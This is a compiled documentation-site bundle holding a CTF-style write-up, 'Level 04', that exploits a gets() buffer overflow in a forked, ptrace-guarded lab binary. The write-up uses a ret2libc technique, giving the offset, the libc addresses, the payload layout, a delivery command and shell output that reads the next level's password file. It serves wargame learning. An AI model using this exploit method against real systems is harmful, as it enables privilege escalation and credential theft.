"use strict";(self.webpackChunkdocumentation=self.webpackChunkdocumentation||[]).push([[543],{3905:(e,n,s)=>{s.d(n,{A:()=>r});var i=s(6540),t=s(4848);const r=({src:e,id:n})=>{const s=(0,i.useRef)(null);return(0,i.useEffect)(()=>{const i=document.createElement("script");return i.src=e,i.id=n,i.async=!0,s.current&&s.current.appendChild(i),()=>{const e=document.getElementById(n);e&&e.remove()}},[e,n]),(0,t.jsx)("div",{ref:s})}},4700:(e,n,s)=>{s.d(n,{A:()=>m});var i=s(6540);const t="codeContainer_ZrQf",r="codeHeader_PMJ9",l="codeTitle_tp4q",c="copyButton_vymH",a="codeContent_hjih",o="commandSection_kIAe",d="prompt_g6zt",h="command_jQGV",u="output_eCt5";var p=s(4848);const m=({command:e,output:n,language:s="bash",title:m})=>{const[x,j]=(0,i.useState)(!1);return(0,p.jsxs)("div",{className:t,children:[m&&(0,p.jsxs)("div",{className:r,children:[(0,p.jsx)("span",{className:l,children:m}),(0,p.jsx)("button",{className:c,onClick:()=>{const s=e||n||"";navigator.clipboard.writeText(s),j(!0),setTimeout(()=>j(!1),2e3)},children:x?"\u2713":"Copy"})]}),(0,p.jsxs)("div",{className:a,children:[e&&(0,p.jsxs)("div",{className:o,children:[(0,p.jsx)("span",{className:d,children:"$"}),(0,p.jsx)("span",{className:h,children:e})]}),n&&(0,p.jsx)("pre",{className:u,children:n})]})]})}},4899:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>p,contentTitle:()=>u,default:()=>j,frontMatter:()=>h,metadata:()=>i,toc:()=>m});const i=JSON.parse('{"id":"level04","title":"\ud83e\uddfc Level 04","description":"<MissionObjective","source":"@site/docs/level04.md","sourceDirName":".","slug":"/level04","permalink":"/docs/level04","draft":false,"unlisted":false,"editUrl":"https://github.com/facebook/docusaurus/tree/main/packages/create-docusaurus/templates/shared/docs/level04.md","tags":[],"version":"current","sidebarPosition":6,"frontMatter":{"sidebar_position":6},"sidebar":"tutorialSidebar","previous":{"title":"\ud83d\udd10 Level 03","permalink":"/docs/level03"},"next":{"title":"\ud83e\uddde\u200d\u2642\ufe0f Level 05","permalink":"/docs/level05"}}');var t=s(4848),r=s(8453),l=s(3905),c=s(7916),a=s(8620),o=s(4700),d=s(6076);const h={sidebar_position:6},u="\ud83e\uddfc Level 04",p={},m=[{value:"Vulnerability Analysis",id:"vulnerability-analysis",level:2},{value:"Binary Behavior Analysis",id:"binary-behavior-analysis",level:2},{value:"Strategy: ret2libc Attack",id:"strategy-ret2libc-attack",level:2},{value:"Live Demonstration",id:"live-demonstration",level:2},{value:"Step 1: Finding EIP Offset",id:"step-1-finding-eip-offset",level:2},{value:"Step 2: Gathering libc Addresses",id:"step-2-gathering-libc-addresses",level:2},{value:"Step 3: Payload Construction",id:"step-3-payload-construction",level:2},{value:"Step 4: Exploitation",id:"step-4-exploitation",level:2},{value:"Technical Deep Dive",id:"technical-deep-dive",level:2},{value:"Fork Protection Analysis",id:"fork-protection-analysis",level:3},{value:"ret2libc vs Shellcode",id:"ret2libc-vs-shellcode",level:3},{value:"Offset Calculation Script",id:"offset-calculation-script",level:2},{value:"Key Learning Points",id:"key-learning-points",level:2},{value:"Technical Summary",id:"technical-summary",level:2}];function x(e){const n={admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",li:"li",mdxAdmonitionTitle:"mdxAdmonitionTitle",ol:"ol",p:"p",strong:"strong",ul:"ul",...(0,r.R)(),...e.components};return(0,t.jsxs)(t.Fragment,{children:[(0,t.jsx)(n.header,{children:(0,t.jsx)(n.h1,{id:"-level-04",children:"\ud83e\uddfc Level 04"})}),"\n",(0,t.jsx)(c.A,{level:"Level 04",target:"level05 privileges",method:"ret2libc buffer overflow with anti-debugging bypass"}),"\n",(0,t.jsx)(n.h2,{id:"vulnerability-analysis",children:"Vulnerability Analysis"}),"\n",(0,t.jsx)(a.A,{type:"Stack-based Buffer Overflow with Protection Bypass",severity:"high",description:"Classic buffer overflow in gets() function within a forked child process. The parent uses ptrace() to prevent exec() calls, requiring ret2libc technique instead of shellcode injection.",techniques:["Buffer Overflow","ret2libc Attack","Fork Analysis","Anti-Debug Bypass"]}),"\n",(0,t.jsx)(n.h2,{id:"binary-behavior-analysis",children:"Binary Behavior Analysis"}),"\n",(0,t.jsx)(o.A,{title:"Program Architecture",command:"# Binary execution flow",output:"1. Program forks into parent and child processes\n2. Parent: Uses ptrace() to monitor child and prevent exec()\n3. Child: Reads input using gets() - VULNERABLE TO OVERFLOW\n4. Anti-shellcode: Any execve attempt is detected and blocked"}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Key Security Features:"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Fork-based isolation"}),": Child process handles user input"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Ptrace monitoring"}),": Parent prevents direct shellcode execution"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Gets() vulnerability"}),": No bounds checking on input buffer"]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"strategy-ret2libc-attack",children:"Strategy: ret2libc Attack"}),"\n",(0,t.jsx)(o.A,{title:"Attack Methodology",command:"# Why ret2libc instead of shellcode",output:'Traditional shellcode with execve() \u2192 BLOCKED by ptrace()\nret2libc technique \u2192 Reuses existing libc functions\nGoal: system("/bin/sh") + exit() + proper arguments'}),"\n",(0,t.jsx)(n.h2,{id:"live-demonstration",children:"Live Demonstration"}),"\n",(0,t.jsx)(l.A,{src:"https://asciinema.org/a/bEHYk4fnHUb3qqFHwEDwbYKkD.js",id:"asciicast-bEHYk4fnHUb3qqFHwEDwbYKkD"}),"\n",(0,t.jsx)(n.h2,{id:"step-1-finding-eip-offset",children:"Step 1: Finding EIP Offset"}),"\n",(0,t.jsx)(o.A,{title:"GDB Setup for Fork Analysis",command:"gdb ./level04",output:"(gdb) set follow-fork-mode child\n(gdb) run"}),"\n",(0,t.jsx)(d.A,{title:"Buffer Overflow Analysis",steps:[{title:"Generate Pattern",description:"Create a unique pattern to identify exact overflow offset",command:"# Input long pattern string",result:"AAAABBBBCCCCDDDD...nnnn..."},{title:"Crash Analysis",description:"Identify which part of pattern overwrites EIP",command:"EIP = 0x6e6e6e6e ('nnnn')",result:"Pattern offset calculation needed"},{title:"Calculate Offset",description:"Find exact position where EIP gets overwritten",command:"pattern.find('nnnn')",result:"Offset = 156 bytes"}]}),"\n",(0,t.jsx)(n.h2,{id:"step-2-gathering-libc-addresses",children:"Step 2: Gathering libc Addresses"}),"\n",(0,t.jsx)(o.A,{title:"Dynamic Address Resolution",command:"(gdb) info functions",output:'(gdb) info functions system\nsystem@plt = 0xf7e6aed0\n\n(gdb) info functions exit  \nexit@plt = 0xf7e5eb70\n\n(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh"\n0xf7f897ec'}),"\n",(0,t.jsx)(n.p,{children:(0,t.jsx)(n.strong,{children:"Critical Addresses:"})}),"\n",(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"system()"}),": ",(0,t.jsx)(n.code,{children:"0xf7e6aed0"})]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:"exit()"}),": ",(0,t.jsx)(n.code,{children:"0xf7e5eb70"})]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.code,{children:'"/bin/sh"'}),": ",(0,t.jsx)(n.code,{children:"0xf7f897ec"})]}),"\n"]}),"\n",(0,t.jsx)(n.h2,{id:"step-3-payload-construction",children:"Step 3: Payload Construction"}),"\n",(0,t.jsx)(o.A,{title:"ret2libc Payload Structure",command:"# Payload layout",output:'[Padding: 156 bytes] + [system addr] + [exit addr] + ["/bin/sh" addr]\n[    Buffer fill    ] + [  EIP->sys  ] + [return addr] + [ argument  ]'}),"\n",(0,t.jsx)(o.A,{title:"Payload Generation",command:'python -c "print A*156 + system_addr + exit_addr + binsh_addr"',output:'Payload breakdown:\n- "A"*156: Fill buffer until EIP\n- system_addr: system() address (little-endian)\n- exit_addr: exit() return address  \n- binsh_addr: "/bin/sh" argument'}),"\n",(0,t.jsx)(n.h2,{id:"step-4-exploitation",children:"Step 4: Exploitation"}),"\n",(0,t.jsx)(o.A,{title:"Payload Delivery",command:"cat /tmp/payload - | ./level04",output:"$ whoami\nlevel05\n$ cat /home/users/level05/.pass\n[SUCCESS - Next level password revealed]"}),"\n",(0,t.jsx)(n.h2,{id:"technical-deep-dive",children:"Technical Deep Dive"}),"\n",(0,t.jsx)(n.h3,{id:"fork-protection-analysis",children:"Fork Protection Analysis"}),"\n",(0,t.jsx)(o.A,{title:"Process Architecture",command:"# Understanding the protection mechanism",output:"Parent Process:\n- Monitors child with ptrace()\n- Blocks any exec() system calls\n- Waits for child completion\n\nChild Process:  \n- Handles user input via gets()\n- Vulnerable to buffer overflow\n- Cannot execute new binaries (exec blocked)"}),"\n",(0,t.jsx)(n.h3,{id:"ret2libc-vs-shellcode",children:"ret2libc vs Shellcode"}),"\n",(0,t.jsxs)(n.admonition,{type:"tip",children:[(0,t.jsx)(n.mdxAdmonitionTitle,{children:(0,t.jsx)(n.strong,{children:"Why ret2libc Works"})}),(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"No New Process"}),": Reuses existing process memory"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Library Functions"}),": Uses already-loaded libc functions"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Ptrace Evasion"}),": No exec() calls to trigger protection"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Clean Execution"}),": Proper function calling convention"]}),"\n"]})]}),"\n",(0,t.jsx)(n.h2,{id:"offset-calculation-script",children:"Offset Calculation Script"}),"\n",(0,t.jsx)(o.A,{title:"Pattern Generation Tool",command:"python",output:'pattern = "".join([\n  f"{a}{b}{c}{d}"\n  for a in "ABCDEFGHIJKLMNOPQRSTUVWXYZ" \n  for b in "abcdefghijklmnopqrstuvwxyz"\n  for c in "0123456789"\n  for d in "0123456789"\n])\n\nprint(pattern.find("nnnn"))  # Output: 156'}),"\n",(0,t.jsx)(n.h2,{id:"key-learning-points",children:"Key Learning Points"}),"\n",(0,t.jsxs)(n.admonition,{type:"warning",children:[(0,t.jsx)(n.mdxAdmonitionTitle,{children:(0,t.jsx)(n.strong,{children:"Anti-Debug Considerations"})}),(0,t.jsxs)(n.ul,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Fork Complexity"}),": Must follow child process in debugger"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Dynamic Addresses"}),": ASLR requires runtime address resolution"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Payload Delivery"}),": Interactive input needed (cat - technique)"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Protection Bypass"}),": Understanding why ret2libc works when shellcode fails"]}),"\n"]})]}),"\n",(0,t.jsx)(n.h2,{id:"technical-summary",children:"Technical Summary"}),"\n",(0,t.jsx)(n.p,{children:"This level demonstrates:"}),"\n",(0,t.jsxs)(n.ol,{children:["\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Advanced Buffer Overflow"})," - Beyond simple shellcode injection"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Process Architecture Analysis"})," - Understanding fork/ptrace protection"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"ret2libc Technique"})," - Function reuse instead of code injection"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Dynamic Analysis"})," - Runtime address resolution and debugging"]}),"\n",(0,t.jsxs)(n.li,{children:[(0,t.jsx)(n.strong,{children:"Protection Bypass"})," - Working around modern security measures"]}),"\n"]}),"\n",(0,t.jsx)(n.p,{children:"The vulnerability showcases how even protected binaries can be exploited through creative techniques that work within the constraints of the security mechanisms."})]})}function j(e={}){const{wrapper:n}={...(0,r.R)(),...e.components};return n?(0,t.jsx)(n,{...e,children:(0,t.jsx)(x,{...e})}):x(e)}},6076:(e,n,s)=>{s.d(n,{A:()=>x});s(6540);const i="stepsContainer_pG2T",t="step_fonX",r="stepHeader_lANh",l="stepNumber_JMan",c="stepTitle_pSoA",a="stepDescription_I1sy",o="codeBlock_MNNe",d="commandLine_KPva",h="prompt_hyWW",u="command_dhjP",p="output_FTQu";var m=s(4848);const x=({steps:e})=>(0,m.jsx)("div",{className:i,children:e.map((e,n)=>(0,m.jsxs)("div",{className:t,children:[(0,m.jsxs)("div",{className:r,children:[(0,m.jsx)("span",{className:l,children:n+1}),(0,m.jsx)("h3",{className:c,children:e.title})]}),(0,m.jsx)("p",{className:a,children:e.description}),e.command&&(0,m.jsxs)("div",{className:o,children:[(0,m.jsxs)("div",{className:d,children:[(0,m.jsx)("span",{className:h,children:"$"}),(0,m.jsx)("code",{className:u,children:e.command})]}),e.output&&(0,m.jsx)("pre",{className:p,children:e.output})]})]},n))})},7916:(e,n,s)=>{s.d(n,{A:()=>h});s(6540);const i="missionCard_aJIf",t="missionHeader_ujCY",r="levelBadge_E6Y7",l="missionTitle_MLqA",c="missionContent_AuQf",a="missionText_YjWt",o="targetCode_IWAs";var d=s(4848);const h=({target:e,method:n,level:s})=>(0,d.jsxs)("div",{className:i,children:[(0,d.jsxs)("div",{className:t,children:[(0,d.jsx)("span",{className:r,children:s}),(0,d.jsx)("h2",{className:l,children:"Mission Objective"})]}),(0,d.jsx)("div",{className:c,children:(0,d.jsxs)("p",{className:a,children:["Gain access to user ",(0,d.jsx)("code",{className:o,children:e})," by exploiting ",n,"."]})})]})},8453:(e,n,s)=>{s.d(n,{R:()=>l,x:()=>c});var i=s(6540);const t={},r=i.createContext(t);function l(e){const n=i.useContext(r);return i.useMemo(function(){return"function"==typeof e?e(n):{...n,...e}},[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(t):e.components||t:l(e.components),i.createElement(r.Provider,{value:n},e.children)}},8620:(e,n,s)=>{s.d(n,{A:()=>p});s(6540);const i="card_anxl",t="header_h_Kv",r="title_xshN",l="severityBadge_p8m1",c="description_LGUH",a="techniques_SXJm",o="techniquesTitle_X_0j",d="techniquesList_aLL1",h="techniqueTag_HgBs";var u=s(4848);const p=({type:e,severity:n,description:s,techniques:p})=>{const m=e=>{switch(e){case"low":return"#22c55e";case"medium":return"#f59e0b";case"high":return"#f97316";case"critical":return"#ef4444";default:return"#6b7280"}};return(0,u.jsxs)("div",{className:i,children:[(0,u.jsxs)("div",{className:t,children:[(0,u.jsx)("h3",{className:r,children:e}),(0,u.jsx)("span",{className:l,style:{backgroundColor:`${m(n)}20`,color:m(n),borderColor:`${m(n)}40`},children:n.toUpperCase()})]}),(0,u.jsx)("p",{className:c,children:s}),(0,u.jsxs)("div",{className:a,children:[(0,u.jsx)("h4",{className:o,children:"Techniques"}),(0,u.jsx)("div",{className:d,children:p.map((e,n)=>(0,u.jsx)("span",{className:h,children:e},n))})]})]})}}}]);